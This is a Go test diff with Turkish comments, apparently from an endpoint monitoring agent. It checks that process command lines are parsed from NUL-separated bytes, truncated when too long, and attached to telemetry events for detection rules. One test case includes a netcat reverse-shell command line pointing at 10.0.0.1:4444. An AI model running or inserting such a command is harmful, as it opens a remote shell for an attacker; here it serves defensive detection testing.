@@ -385,3 +385,61 @@ func TestProcessTelemetryEmitsNewProcesses(t *testing.T) {
 		t.Fatalf("değişiklik yokken yeni PROCESS olayı üretilmemeli (%d → %d)", before, countProc())
 	}
 }
+
+func TestParseCmdline(t *testing.T) {
+	cases := []struct{ in, want string }{
+		{"", ""},
+		{"\x00", ""},
+		{"reg\x00add\x00HKLM\\X\x00/f\x00", "reg add HKLM\\X /f"},
+		{"/usr/bin/crontab\x00-l", "/usr/bin/crontab -l"},
+		{"nc\x00-e\x00/bin/sh\x0010.0.0.1\x004444", "nc -e /bin/sh 10.0.0.1 4444"},
+		{"single", "single"},
+	}
+	for _, c := range cases {
+		if got := parseCmdline([]byte(c.in)); got != c.want {
+			t.Errorf("parseCmdline(%q)=%q beklenen %q", c.in, got, c.want)
+		}
+	}
+	// Çok uzun komut-satırı güvenle kırpılır.
+	long := make([]byte, maxCmdlineBytes+100)
+	for i := range long {
+		long[i] = 'a'
+	}
+	got := parseCmdline(long)
+	if len(got) <= maxCmdlineBytes || !strings.HasSuffix(got, "…") {
+		t.Errorf("uzun cmdline kırpılmalı ve '…' ile bitmeli; len=%d", len(got))
+	}
+}
+
+// TestProcessTelemetryIncludesCmdline, komut-satırı taşıyan bir süreç için PROCESS
+// olayının hem mesaja hem Details'e cmdline eklediğini doğrular (argüman-tabanlı
+// sunucu tespit kurallarının native telemetride de eşleşebilmesi için).
+func TestProcessTelemetryIncludesCmdline(t *testing.T) {
+	ctrl := &fakeCtrl{procs: []Process{{PID: 10, Name: "init"}}}
+	buf := collector.NewBuffer(100)
+	mon := NewMonitor(ctrl, fixedClock(time.Now()), buf, 42)
+	mon.SetProcessTelemetry(true)
+	engine := policy.New(policy.Bundle{})
+	if _, err := mon.Tick(engine); err != nil { // taban çizgisi
+		t.Fatal(err)
+	}
+	ctrl.procs = append(ctrl.procs, Process{PID: 77, Name: "reg.exe", PPID: 10, Cmdline: `reg add HKLM\Software\X /v Y /f`})
+	if _, err := mon.Tick(engine); err != nil {
+		t.Fatal(err)
+	}
+	var found bool
+	for _, e := range buf.Pending(100) {
+		if e.Category == "PROCESS" && e.Details["pid"] == 77 {
+			found = true
+			if e.Details["cmdline"] != `reg add HKLM\Software\X /v Y /f` {
+				t.Errorf("Details.cmdline eksik/yanlış: %v", e.Details["cmdline"])
+			}
+			if !strings.Contains(e.Message, "reg add HKLM") {
+				t.Errorf("mesaj cmdline içermeli: %q", e.Message)
+			}
+		}
+	}
+	if !found {
+		t.Fatal("cmdline taşıyan PROCESS olayı bulunamadı")
+	}
+}
